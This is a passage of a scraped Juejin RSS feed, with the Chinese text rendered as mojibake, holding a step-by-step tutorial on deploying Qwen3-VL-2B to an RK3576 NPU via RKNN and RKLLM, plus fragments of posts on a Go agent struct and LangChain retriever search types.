<span class="hljs-keyword">type</span> LeaveInfo <span class="hljs-keyword">struct</span> {
    StartDate   <span class="hljs-type">string</span> <span class="hljs-string">`json:"startDate" jsonschema:"required;description=è¯·å‡å¼€å§‹æ—¶é—´"`</span>
    EndDate     <span class="hljs-type">string</span> <span class="hljs-string">`json:"endDate" jsonschema:"required;description=è¯·å‡ç»“æŸæ—¶é—´"`</span>
    LeaveType   <span class="hljs-type">string</span> <span class="hljs-string">`json:"leaveType" jsonschema:"required;description=è¯·å‡ç±»å‹"`</span>
    LeaveReason <span class="hljs-type">string</span> <span class="hljs-string">`json:"leaveReason" jsonschema:"required;description=è¯·å‡åŸå› "`</span>
}
</code></pre>
<p>5ã€æŸ¥çœ‹ç»“æœ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/467ca95f7c1347a3ab9220dc1ba6869a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MzA3NTAwOTMwMzc5Mw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769061583&amp;x-signature=SLQ5xROdydcj%2FD9gQ39IGsHIims%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/987869c9f6864c6d8e5b8651f6a0d18e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MzA3NTAwOTMwMzc5Mw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769061583&amp;x-signature=cpAhap8pGZpzce6gXQHWx8WXDOM%3D" alt="image.png" loading="lazy"/></p>
<p>æ€»ç»“ï¼šæ•´ä½“ä½“éªŒä¸é”™ï¼Œagentçš„ä¸­æ–­å’Œæ¢å¤ï¼Œå¯ä»¥çµæ´»çš„å®Œæˆå„ç§åœºæ™¯</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Qwen3-VL-2B åœ¨ RK3576 ä¸Šçš„éƒ¨ç½²å®è·µï¼šRKNN + RKLLM å…¨æµç¨‹]]></title>    <link>https://juejin.cn/post/7595157651619987482</link>    <guid>https://juejin.cn/post/7595157651619987482</guid>    <pubDate>2026-01-15T06:22:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595157651619987482" data-draft-id="7595108457496199183" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Qwen3-VL-2B åœ¨ RK3576 ä¸Šçš„éƒ¨ç½²å®è·µï¼šRKNN + RKLLM å…¨æµç¨‹"/> <meta itemprop="keywords" content="ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-15T06:22:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FastMoMO"/> <meta itemprop="url" content="https://juejin.cn/user/854760647561804"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Qwen3-VL-2B åœ¨ RK3576 ä¸Šçš„éƒ¨ç½²å®è·µï¼šRKNN + RKLLM å…¨æµç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/854760647561804/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FastMoMO
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:22:10.000Z" title="Thu Jan 15 2026 06:22:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡è®°å½•ä¸€æ¬¡å®Œæ•´ã€å¯å¤ç°çš„å·¥ç¨‹å®è·µï¼š<br/>
åœ¨ <strong>RK3576</strong> å¹³å°ä¸Šï¼Œå°†å¤šæ¨¡æ€å¤§æ¨¡å‹ <strong>Qwen3-VL-2B</strong> æ‹†åˆ†å¹¶éƒ¨ç½²åˆ° NPU ä¸Šè¿è¡Œã€‚</p>
<p>ç›®æ ‡ä¸æ˜¯ä»‹ç»å·¥å…·åŠŸèƒ½ï¼Œè€Œæ˜¯è®©è¯»è€…ï¼š</p>
<blockquote>
<p><strong>æŒ‰ç…§æœ¬æ–‡æ­¥éª¤æ‰§è¡Œä»£ç ï¼Œæœ€ç»ˆåœ¨æ¿ç«¯æˆåŠŸè·‘èµ·å¤šæ¨¡æ€æ¨ç† Demoã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æ•´ä½“éƒ¨ç½²æµç¨‹æ€»è§ˆï¼ˆå…ˆçœ‹å…¨å±€ï¼‰</h2>
<p>åœ¨ RK å¹³å°ä¸Šï¼Œå¤šæ¨¡æ€æ¨¡å‹<strong>æ— æ³•ä»¥å•ä¸€æ¨¡å‹éƒ¨ç½²</strong>ï¼Œå¿…é¡»æ‹†åˆ†ä¸ºä¸¤ä¸ªå­æ¨¡å‹ï¼š</p>
<ul>
<li>Vision Encoder â†’ <code>.rknn</code></li>
<li>LLM Decoder â†’ <code>.rkllm</code></li>
</ul>
<p>æ•´ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/494cb71355e94d34a0d852ce79687ad6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFzdE1vTU8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062930&amp;x-signature=foIZxc7HqboN4y0iZSr0p%2FTgpTw%3D" alt="Image" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a3c454a970e4f48a11680db74c46da0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFzdE1vTU8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062930&amp;x-signature=T3zWC1KixG4eMd3qSfuXtYWMfO4%3D" alt="Image" loading="lazy"/></p>
<p><strong>æœ¬æ–‡æœ€ç»ˆäº§ç‰©ï¼š</strong></p>
<pre><code class="hljs">qwen3-vl_vision_rk3576.rknn
qwen3-vl-2b-instruct_w8a8_rk3576.rkllm
</code></pre>
<hr/>
<h2 data-id="heading-1">äºŒã€ç¯å¢ƒå‡†å¤‡ï¼ˆå¿…é¡»ä¸€è‡´ï¼‰</h2>
<h3 data-id="heading-2">1ï¸âƒ£ ä¸»æœºç¯å¢ƒï¼ˆæ¨¡å‹è½¬æ¢ï¼‰</h3>





















<table><thead><tr><th>é¡¹ç›®</th><th>ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>OS</td><td>Ubuntu 22.04 x86_64</td></tr><tr><td>Python</td><td>3.10</td></tr><tr><td>å·¥å…·</td><td>Miniforge / Conda</td></tr></tbody></table>
<h3 data-id="heading-3">2ï¸âƒ£ å¼€å‘æ¿ç¯å¢ƒ</h3>





















<table><thead><tr><th>é¡¹ç›®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>èŠ¯ç‰‡</td><td>RK3576</td></tr><tr><td>ç³»ç»Ÿ</td><td>Linux</td></tr><tr><td>æ¨ç†</td><td>NPU</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€æ¨¡å‹å‡†å¤‡</h2>
<p>æ‹‰å– Qwen3-VL-2B æ¨¡å‹ï¼ˆHuggingFace / ModelScope å‡å¯ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://huggingface.co/Qwen/Qwen3-VL-2B-Instruct
</code></pre>
<p>å‡è®¾æ¨¡å‹è·¯å¾„ä¸ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/workspace/Qwen3-VL-2B-Instruct
</code></pre>
<hr/>
<h2 data-id="heading-5">å››ã€LLM éƒ¨åˆ†ï¼šRKLLM è½¬æ¢ä¸é‡åŒ–ï¼ˆæ ¸å¿ƒï¼‰</h2>
<h3 data-id="heading-6">4.1 åŠ è½½æ¨¡å‹</h3>
<pre><code class="hljs language-ini" lang="ini">from rkllm.api import RKLLM

<span class="hljs-attr">llm</span> = RKLLM()

<span class="hljs-attr">ret</span> = llm.load_huggingface(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"/workspace/Qwen3-VL-2B-Instruct"</span>,
    <span class="hljs-attr">device</span>=<span class="hljs-string">"cpu"</span>,
    <span class="hljs-attr">dtype</span>=<span class="hljs-string">"float16"</span>,
)

if ret != 0:
    raise RuntimeError("load_huggingface failed")
</code></pre>
<p><strong>è¯´æ˜ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ CPU è½¬æ¢ï¼Œé¿å…æ˜¾å­˜ä¸è¶³</li>
<li>FP16 å¯¹ w8a8 é‡åŒ–è¶³å¤Ÿ</li>
</ul>
<hr/>
<h3 data-id="heading-7">4.2 æ„å»ºé‡åŒ–æ•°æ®é›†ï¼ˆå…³é”®æ­¥éª¤ï¼‰</h3>
<p>å¤šæ¨¡æ€æ¨¡å‹ä¸èƒ½ç›´æ¥é‡åŒ–åŸå§‹å›¾åƒè¾“å…¥ï¼Œéœ€è¦å…ˆæ„é€  <code>inputs_embeds</code>ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">inputs_embeds</span> = model.get_input_embeddings()(inputs[<span class="hljs-string">"input_ids"</span>])

<span class="hljs-attr">image_mask</span> = inputs[<span class="hljs-string">"input_ids"</span>] == model.config.image_token_id
<span class="hljs-attr">image_embeds</span> = model.visual(
    inputs<span class="hljs-section">["pixel_values"]</span>,
    <span class="hljs-attr">grid_thw</span>=inputs[<span class="hljs-string">"image_grid_thw"</span>]
)

inputs_embeds<span class="hljs-section">[image_mask]</span> = image_embeds
</code></pre>
<p>å°† <code>inputs_embeds</code> ä¿å­˜ä¸º numpyï¼Œç”¨äºé‡åŒ–æ ¡å‡†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
np.<span class="hljs-title function_">save</span>(<span class="hljs-string">"inputs_embeds.npy"</span>, inputs_embeds.<span class="hljs-title function_">cpu</span>().<span class="hljs-title function_">numpy</span>())
</code></pre>
<p>æœ€ç»ˆç”Ÿæˆ <code>inputs.json</code>ï¼Œä½œä¸º RKLLM çš„æ ¡å‡†æ•°æ®é›†ã€‚</p>
<hr/>
<h3 data-id="heading-8">4.3 æ„å»ºå¹¶å¯¼å‡º RKLLM æ¨¡å‹</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ret</span> = llm.build(
    <span class="hljs-attr">do_quantization</span>=<span class="hljs-literal">True</span>,
    <span class="hljs-attr">quantized_dtype</span>=<span class="hljs-string">"w8a8"</span>,
    <span class="hljs-attr">quantized_algorithm</span>=<span class="hljs-string">"normal"</span>,
    <span class="hljs-attr">target_platform</span>=<span class="hljs-string">"RK3576"</span>,
    <span class="hljs-attr">num_npu_core</span>=<span class="hljs-number">2</span>,
    <span class="hljs-attr">dataset</span>=<span class="hljs-string">"data/inputs.json"</span>
)

if ret != 0:
    raise RuntimeError("build failed")

llm.export_rkllm(
    "qwen3-vl-2b-instruct_w8a8_rk3576.rkllm"
)
</code></pre>
<hr/>
<h2 data-id="heading-9">äº”ã€Vision éƒ¨åˆ†ï¼šONNX â†’ RKNN</h2>
<h3 data-id="heading-10">5.1 å¯¼å‡º Vision ONNX</h3>
<pre><code class="hljs language-css" lang="css">python export_vision<span class="hljs-selector-class">.py</span> \
  <span class="hljs-attr">--path</span> /workspace/Qwen3-VL-<span class="hljs-number">2</span>B-Instruct \
  <span class="hljs-attr">--model_name</span> qwen3-vl \
  <span class="hljs-attr">--height</span> <span class="hljs-number">448</span> \
  <span class="hljs-attr">--width</span> <span class="hljs-number">448</span>
</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="hljs">qwen3-vl_vision.onnx
</code></pre>
<hr/>
<h3 data-id="heading-11">5.2 ONNX è½¬ RKNN</h3>
<pre><code class="hljs language-css" lang="css">python export_vision_rknn<span class="hljs-selector-class">.py</span> \
  <span class="hljs-attr">--path</span> qwen3-vl_vision<span class="hljs-selector-class">.onnx</span> \
  <span class="hljs-attr">--target-platform</span> rk3576 \
  <span class="hljs-attr">--height</span> <span class="hljs-number">448</span> \
  <span class="hljs-attr">--width</span> <span class="hljs-number">448</span>
</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="hljs">qwen3-vl_vision_rk3576.rknn
</code></pre>
<hr/>
<h2 data-id="heading-12">å…­ã€æ¿ç«¯éƒ¨ç½²ä¸è¿è¡Œ</h2>
<h3 data-id="heading-13">6.1 æ‹·è´æ–‡ä»¶åˆ°å¼€å‘æ¿</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">qwen3-vl_vision_rk3576.rknn
qwen3-vl-<span class="hljs-number">2</span>b-instruct_w8a8_rk3576.rkllm
demo
<span class="hljs-keyword">lib</span>/
</code></pre>
<hr/>
<h3 data-id="heading-14">6.2 è®¾ç½®è¿è¡Œç¯å¢ƒ</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=./lib:<span class="hljs-variable">$LD_LIBRARY_PATH</span>
</code></pre>
<hr/>
<h3 data-id="heading-15">6.3 è¿è¡Œ Demo</h3>
<pre><code class="hljs language-bash" lang="bash">./demo demo.jpg \
  qwen3-vl_vision_rk3576.rknn \
  qwen3-vl-2b-instruct_w8a8_rk3576.rkllm \
  256 2048 2 \
  <span class="hljs-string">"&lt;|vision_start|&gt;"</span> <span class="hljs-string">"&lt;|vision_end|&gt;"</span> <span class="hljs-string">"&lt;|image_pad|&gt;"</span>
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>vision_start / vision_end</code>ï¼šæ ‡è¯†è§†è§‰ embedding è¾¹ç•Œ</li>
<li><code>image_pad</code>ï¼šå¤šå›¾æˆ–è¡¥é½å ä½ç¬¦</li>
</ul>
<hr/>
<h2 data-id="heading-16">ä¸ƒã€ç»“æœéªŒè¯</h2>
<p>è¿è¡ŒæˆåŠŸåï¼Œç»ˆç«¯ä¼šè¾“å‡ºæ¨¡å‹å¯¹å›¾ç‰‡å†…å®¹çš„æè¿°æˆ–å›ç­”ã€‚</p>
<p>è‡³æ­¤ï¼Œä¸€ä¸ª <strong>å®Œæ•´çš„ç«¯ä¾§å¤šæ¨¡æ€æ¨ç†æµç¨‹éƒ¨ç½²å®Œæˆ</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-17">å…«ã€å®è·µæ€»ç»“</h2>
<ol>
<li>RK å¹³å°å¤šæ¨¡æ€æ¨¡å‹å¿…é¡»æ‹†åˆ†</li>
<li>RKLLM çš„æ ¸å¿ƒæ˜¯é‡åŒ–ä¸è¿è¡Œæ—¶ç®¡ç†</li>
<li>é‡åŒ–æ•°æ®å‡†å¤‡æ˜¯æˆåŠŸå…³é”®</li>
<li>w8a8 æ˜¯å½“å‰æœ€ç¨³å¦¥çš„å·¥ç¨‹é€‰æ‹©</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VectorStoreRetriever ä¸‰ç§æœç´¢ç±»å‹]]></title>    <link>https://juejin.cn/post/7595289498445791258</link>    <guid>https://juejin.cn/post/7595289498445791258</guid>    <pubDate>2026-01-15T07:19:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595289498445791258" data-draft-id="7595351120667885594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VectorStoreRetriever ä¸‰ç§æœç´¢ç±»å‹"/> <meta itemprop="keywords" content="Python,LangChain"/> <meta itemprop="datePublished" content="2026-01-15T07:19:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sky1720"/> <meta itemprop="url" content="https://juejin.cn/user/791239358694760"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VectorStoreRetriever ä¸‰ç§æœç´¢ç±»å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/791239358694760/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sky1720
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:19:20.000Z" title="Thu Jan 15 2026 07:19:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">VectorStoreRetriever ä¸‰ç§æœç´¢ç±»å‹æ·±åº¦è§£æï¼šå·®å¼‚ã€åœºæ™¯ä¸é€‰å‹</h2>
<p>åœ¨ LangChain ç­‰å¤§æ¨¡å‹åº”ç”¨å¼€å‘ä¸­ï¼Œ<code>VectorStoreRetriever</code> æ˜¯è¿æ¥å‘é‡æ•°æ®åº“ä¸å¤§æ¨¡å‹çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£ä»çŸ¥è¯†åº“ä¸­ç²¾å‡†å¬å›ä¸æŸ¥è¯¢ç›¸å…³çš„æ–‡æ¡£ã€‚å®ƒæ”¯æŒä¸‰ç§æ ¸å¿ƒæœç´¢ç±»å‹ï¼š<code>similarity</code>ï¼ˆé»˜è®¤ï¼‰ã€<code>similarity_score_threshold</code>ã€<code>mmr</code>ã€‚</p>
